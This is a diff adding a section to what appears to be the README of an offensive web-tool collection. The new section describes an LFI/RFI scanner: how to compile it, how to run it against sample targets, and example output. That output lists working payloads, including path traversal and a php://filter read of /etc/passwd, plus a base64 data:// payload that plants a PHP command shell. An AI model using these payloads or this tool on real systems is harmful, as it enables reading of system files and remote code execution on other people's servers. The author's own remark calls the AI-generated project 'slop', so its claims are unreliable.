@@ -234,5 +234,27 @@ x86_64-w64-mingw32-gcc -O3 -o openredirect.exe openredirect.c -lssl -lcrypto -lp
     → XSS via open redirect!
 </pre>
 
+15. LFI/RFI Scanner
+
+<pre>
+# Linux / macOS / WSL
+gcc -O3 -o lfi-rfi lfi-rfi.c -lssl -lcrypto -lpthread
+
+# Windows
+x86_64-w64-mingw32-gcc -O3 -o lfi-rfi.exe lfi-rfi.c -lssl -lcrypto -lpthread
+
+# Use it
+./lfi-rfi "http://10.10.10.88/page.php?file="
+./lfi-rfi "https://legacy.corp/include.php?inc="
+
+[+] VULNERABLE → http://10.10.10.88/page.php?file=../../../etc/passwd
+    → Classic LFI (CRITICAL)
+[+] VULNERABLE → http://10.10.10.88/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+    → PHP Filter Chain → RCE possible
+[+] VULNERABLE → http://10.10.10.88/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K
+    → RCE via wrapper (GOD MODE)
+</pre>
+
+
 > P.S. I used Grok because of unrestricted tokens, no rate limits and premium subscription required. Grok was always so smart. Highly underestimated. This project has been birthed during Thanksgiving weekend. I hope everyone is thankful for such awesome slop.
 
